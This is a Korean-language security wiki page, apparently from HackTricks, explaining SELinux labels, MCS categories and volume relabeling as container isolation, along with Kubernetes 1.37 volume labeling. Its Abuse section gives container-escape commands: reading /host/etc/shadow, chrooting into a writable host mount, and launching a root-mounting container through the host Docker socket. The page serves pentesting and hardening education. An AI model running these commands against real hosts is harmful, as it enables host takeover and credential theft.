# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

SELinux는 **label-based Mandatory Access Control** 시스템입니다. 관련된 모든 process와 object에는 security context가 부여될 수 있으며, policy는 어떤 domain이 어떤 type과 어떤 방식으로 상호작용할 수 있는지 결정합니다. containerized environment에서는 일반적으로 runtime이 confined container domain에서 container process를 실행하고, container content에는 그에 해당하는 type을 부여합니다. policy가 제대로 작동하면 process는 자신의 label이 접근하도록 허용된 대상을 읽고 쓸 수 있지만, 해당 content가 mount를 통해 보이게 되더라도 다른 host content에 대한 접근은 거부될 수 있습니다.

이는 일반적인 Linux container deployment에서 사용할 수 있는 가장 강력한 host-side protection 중 하나입니다. Fedora, RHEL, CentOS Stream, OpenShift 및 기타 SELinux 중심 ecosystem에서 특히 중요합니다. 이러한 environment에서 SELinux를 무시하는 reviewer는 겉보기에는 명확한 host compromise 경로가 실제로 차단되는 이유를 이해하지 못하는 경우가 많습니다.

## AppArmor Vs SELinux

가장 간단한 high-level 차이점은 AppArmor가 path-based인 반면 SELinux는 **label-based**라는 것입니다. 이는 container security에 큰 영향을 미칩니다. path-based policy는 동일한 host content가 예상하지 못한 mount path 아래에 표시될 경우 다르게 동작할 수 있습니다. 반면 label-based policy는 object의 label이 무엇인지, 그리고 process domain이 해당 object에 어떤 작업을 수행할 수 있는지를 확인합니다. 그렇다고 SELinux가 단순해지는 것은 아니지만, AppArmor 기반 system에서 defender가 때때로 잘못 가정하는 path-trick 유형의 문제에 대해서는 더 강력하게 대응할 수 있습니다.

이 model은 label 중심이므로 container volume 처리와 relabeling 결정은 security-critical합니다. runtime 또는 operator가 "mount가 작동하도록" label을 지나치게 광범위하게 변경하면 workload를 격리하기 위해 마련된 policy boundary가 의도보다 훨씬 약해질 수 있습니다.

## 실습

host에서 SELinux가 활성화되어 있는지 확인하려면:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
호스트의 기존 labels를 확인하려면:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
일반 실행과 labeling이 비활성화된 실행을 비교하려면:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinux가 활성화된 host에서 이는 매우 실용적인 시연입니다. 예상된 container domain에서 실행되는 workload와 해당 enforcement layer가 제거된 workload의 차이를 보여주기 때문입니다.

## Runtime 사용

SELinux가 platform 기본 구성의 일부인 시스템에서 Podman은 SELinux와 특히 잘 연동됩니다. Rootless Podman과 SELinux의 조합은 가장 강력한 mainstream container baseline 중 하나입니다. host 측에서 process가 이미 unprivileged 상태이며, 동시에 MAC policy에 의해 계속 confined되기 때문입니다. 지원되는 환경에서는 Docker도 SELinux를 사용할 수 있지만, 관리자들이 volume-labeling 문제를 우회하기 위해 SELinux를 비활성화하는 경우가 있습니다. CRI-O와 OpenShift는 container isolation의 주요 구성 요소로 SELinux에 크게 의존합니다. Kubernetes도 SELinux 관련 설정을 노출할 수 있지만, 그 가치는 해당 node OS가 실제로 SELinux를 지원하고 enforce하는지에 따라 달라집니다.<sup>[[2]](#references)</sup>

반복해서 기억해야 할 점은 SELinux가 선택적으로 추가하는 장식이 아니라는 것입니다. SELinux를 중심으로 구축된 ecosystem에서는 SELinux가 예상되는 security boundary의 일부입니다. host 측 policy enumeration, transition analysis, SELinux administration tools의 abuse에 대해서는 [일반 SELinux 페이지](../../../interesting-files-permissions/selinux.md)를 참조하세요.

## MCS Categories 및 Volume Relabeling

Container isolation은 일반적으로 **type enforcement**와 **Multi-Category Security (MCS)**의 조합입니다. 두 process가 모두 `container_t`로 실행되더라도 `s0:c123,c456`와 `s0:c321,c654`처럼 서로 다른 level을 할당받을 수 있습니다. Private container content에는 일치하는 categories가 포함된 `container_file_t` label이 지정되므로, 단순히 다른 container의 path에 도달하는 것만으로는 해당 path에 access할 수 없습니다. Runtimes는 일반적으로 category pair를 할당하며, level을 수동으로 재사용하면 container별 separation이 의도적으로 무너집니다.<sup>[[3]](#references)</sup>

type만 확인하지 말고 process와 mount의 labels를 비교하세요:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Bind-mount suffixes는 호스트 inode label을 변경하므로 단순히 mount metadata만 변경하는 것이 아니라 security boundary도 변경합니다:<sup>[[3]](#references)</sup>

- `:Z`는 컨테이너의 MCS categories를 사용하는 private label을 적용합니다. 하나의 컨테이너 또는 Pod가 소유한 volume에 적합합니다.
- `:z`는 다른 confined container도 해당 content를 사용할 수 있도록 shared label을 적용합니다(DAC permissions의 적용을 받음). 이를 secrets 또는 tenant-specific data에 사용하면 컨테이너를 분리하는 MCS isolation이 제거됩니다.
- Relabeling은 recursive하게 적용됩니다. `/`, `/etc`, `/usr`와 같은 광범위한 host tree 또는 전체 home tree에 어느 옵션이든 적용하면 선택한 컨테이너에 content가 노출될 뿐만 아니라, 예상 label이 대체되어 host services가 중단될 수 있습니다.

Manual level reuse는 command lines와 manifests에서 쉽게 확인할 수 있습니다. 다음 두 컨테이너는 의도적으로 동일한 MCS level을 할당받으므로 해당 level로 label된 content를 사용할 수 있습니다:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
또한 `label=nested`와 `label=disable`을 구분해야 합니다. 전자는 컨테이너 내부에서 SELinux operations를 노출하고 policy가 허용하는 경우에만 label 변경을 허용하는 반면, 후자는 해당 workload에 대한 label separation을 제거합니다. 둘 다 검토할 필요가 있지만 서로 동등하지는 않습니다.<sup>[[3]](#references)</sup>

## Misconfigurations

전형적인 실수는 `label=disable`입니다. 운영 환경에서는 volume mount가 거부되었을 때 labeling model을 수정하는 대신 SELinux를 문제에서 제외하는 것이 가장 빠른 단기 해결책으로 선택되면서 이런 일이 자주 발생합니다.<sup>[[1]](#references)</sup> 또 다른 일반적인 실수는 host content의 잘못된 relabeling입니다. 광범위한 relabel operation을 수행하면 애플리케이션이 작동할 수 있지만, 원래 의도했던 범위를 훨씬 넘어 container가 접근할 수 있는 대상을 확장할 수도 있습니다.

또한 **installed** SELinux와 **effective** SELinux를 혼동하지 않는 것이 중요합니다. host가 SELinux를 지원하더라도 permissive mode일 수 있으며, runtime이 workload를 예상한 domain으로 실행하지 않을 수도 있습니다. 이런 경우 protection은 documentation이 암시하는 것보다 훨씬 약합니다.

## Abuse

SELinux가 없거나 permissive 상태이거나 workload에 대해 광범위하게 비활성화되어 있으면 host-mounted path를 abuse하기가 훨씬 쉬워집니다. 그렇지 않으면 label에 의해 제한되었을 동일한 bind mount가 host data에 접근하거나 host를 수정하는 직접적인 수단이 될 수 있습니다. 이는 writable volume mount, container runtime directory 또는 편의를 위해 민감한 host path를 노출한 operational shortcut과 결합될 때 특히 중요합니다.

SELinux는 runtime flag가 비슷해 보이는데도 generic breakout writeup이 한 host에서는 즉시 작동하고 다른 host에서는 계속 실패하는 이유를 설명하는 경우가 많습니다. 누락된 요소는 namespace나 capability가 전혀 아니라, 유지된 label boundary인 경우가 많습니다.

가장 빠른 practical check는 active context를 비교한 다음, 일반적으로 label-confined 상태여야 하는 mounted host path 또는 runtime directory를 probe하는 것입니다:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
호스트 bind mount가 존재하고 SELinux labeling이 비활성화되었거나 약화된 경우, information disclosure가 먼저 발생하는 경우가 많습니다:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
mount가 writable하고 kernel 관점에서 container가 사실상 host-root라면, 다음 단계는 추측하는 대신 제어된 host 수정을 테스트하는 것입니다:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux를 지원하는 호스트에서는 런타임 상태 디렉터리의 label이 손실되면 직접적인 권한 상승 경로가 노출될 수도 있습니다:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
이 명령들은 전체 escape chain을 대체하지는 않지만, SELinux가 host data access 또는 host-side file modification을 차단하고 있었는지 매우 빠르게 확인할 수 있게 해줍니다.

### 전체 예시: SELinux 비활성화 + 쓰기 가능한 host mount

SELinux labeling이 비활성화되어 있고 host filesystem이 `/host`에 쓰기 가능하도록 mount되어 있다면, 전체 host escape는 일반적인 bind-mount abuse case가 됩니다:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot`가 성공하면 컨테이너 프로세스는 이제 호스트 파일 시스템에서 작동합니다:
```bash
id
hostname
cat /etc/passwd | tail
```
### 전체 예시: SELinux 비활성화 + Runtime 디렉터리

labels가 비활성화된 후 workload가 runtime socket에 접근할 수 있다면, escape를 runtime에 위임할 수 있습니다:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
관련 관찰 사항은 SELinux가 정확히 이러한 종류의 host-path 또는 runtime-state 접근을 방지하는 제어 기능인 경우가 많았다는 점입니다.

## 검사

SELinux 검사의 목표는 SELinux가 활성화되어 있는지 확인하고, 현재 security context를 식별하며, 관심 있는 파일이나 경로가 실제로 label-confined 상태인지 확인하는 것입니다.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
여기서 흥미로운 점:

- `getenforce`는 이상적으로 `Enforcing`을 반환해야 합니다. `Permissive` 또는 `Disabled`이면 SELinux 섹션 전체의 의미가 달라집니다.
- 현재 프로세스 context가 예상과 다르거나 지나치게 광범위해 보인다면, workload가 의도한 container policy 아래에서 실행되고 있지 않을 수 있습니다.
- host에 mount된 파일이나 runtime directory의 label에 프로세스가 지나치게 자유롭게 접근할 수 있다면, bind mount는 훨씬 더 위험해집니다.

SELinux-capable platform에서 container를 검토할 때 labeling을 부차적인 세부 사항으로 취급하지 마세요. 많은 경우 labeling은 host가 아직 compromise되지 않은 주요 이유 중 하나입니다.

## Runtime 기본값

| Runtime / platform | 기본 상태 | 기본 동작 | 일반적인 수동 약화 |
| --- | --- | --- | --- |
| Docker Engine | Host에 따라 다름 | SELinux-enabled host에서 SELinux separation을 사용할 수 있지만, 정확한 동작은 host/daemon configuration에 따라 달라짐 | `--security-opt label=disable`, bind mount의 광범위한 relabeling, `--privileged` |
| Podman | SELinux host에서 일반적으로 enabled | disabled로 설정하지 않는 한 SELinux system에서 SELinux separation은 Podman의 일반적인 구성 요소임 | `--security-opt label=disable`, `containers.conf`의 `label=false`, `--privileged` |
| Kubernetes | SELinux node에서 runtime이 할당하며 명시적으로 configuration 가능 | Pod에서 label을 설정하지 않으면 runtime이 고유한 label을 할당할 수 있음. 명시적인 `securityContext.seLinuxOptions`가 Pod/volume label을 제어하며, Kubernetes 1.37에서는 조건을 충족하는 volume이 기본적으로 SELinux mount labeling을 사용함 | 중복된 MCS level, permissive/disabled node, 광범위한 privileged workload, 무분별한 `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / OpenShift style deployments | 일반적으로 크게 의존함 | 이러한 environment에서는 SELinux가 node isolation model의 핵심 부분인 경우가 많음 | access 범위를 지나치게 넓히는 custom policy, compatibility를 위한 labeling 비활성화 |

SELinux default는 seccomp default보다 distribution에 더 많이 의존합니다. Fedora/RHEL/OpenShift-style system에서는 SELinux가 isolation model의 핵심인 경우가 많습니다. non-SELinux system에서는 SELinux가 단순히 존재하지 않습니다.

## Kubernetes 1.37 Volume Labeling

Kubernetes 1.37에서는 `SELinuxMount`가 stable 상태가 되었고 기본적으로 enabled되었습니다. 조건을 충족하는 PVC, `seLinuxOptions`가 설정된 Pod, `.spec.seLinuxMount: true`를 알리는 CSI driver가 있는 경우, kubelet은 모든 inode를 recursive하게 relabel하도록 runtime에 요청하는 대신 `-o context=<label>`을 사용합니다. 지원되지 않는 driver와 volume type은 여전히 recursive path를 사용합니다. 이를 통해 대규모 relabel 작업을 피할 수 있으며, volume을 Pod에 노출하기 위해 모든 파일의 persistent label을 변경하는 것도 방지할 수 있습니다.<sup>[[2]](#references)[[4]](#references)</sup>

mount에는 이러한 context를 하나만 지정할 수 있습니다. 따라서 동일한 node에서 **서로 다른 SELinux label**을 가진 Pod가 동일한 eligible volume을 사용하는 경우, 기본 `MountOption` 동작에서는 더 이상 함께 실행되지 않습니다. 한 Pod는 `conflicting SELinux labels of volume` error와 함께 `ContainerCreating` 상태로 남습니다. 이를 availability issue이자 workload가 MCS boundary를 넘어 storage를 암묵적으로 공유하고 있었다는 유용한 신호로 간주하세요. 이러한 sharing이 의도된 경우(예: privileged `spc_t` Pod와 confined Pod가 동일한 volume을 사용하는 경우), Pod별 compatibility escape hatch는 `seLinuxChangePolicy: Recursive`입니다. runtime이 어떤 path를 relabel할지 이해하지 않은 상태에서 이를 cluster-wide로 적용하지 마세요.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
유용한 클러스터 측 점검:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
선택적 kube-controller-manager `selinux-warning-controller`는 호환되지 않는 label이 있는 volume을 공유하는 Pod를 감지하고 `selinux_warning_controller_selinux_volume_conflict` metric을 노출합니다. 업그레이드 전 또는 volume-label 동작을 변경하기 전에 이를 활성화하고 검토하세요. 이를 통해 실제 policy 충돌과 일반적인 CSI 또는 filesystem 오류를 구분하는 데 도움이 됩니다.<sup>[[2]](#references)</sup>

## References

- [1] [Podman 문서: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Pod 또는 Container의 Security Context 구성](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Podman run 문서: SELinux labels 및 volume relabeling](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Kubernetes v1.37 릴리스: SELinuxMount 및 SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
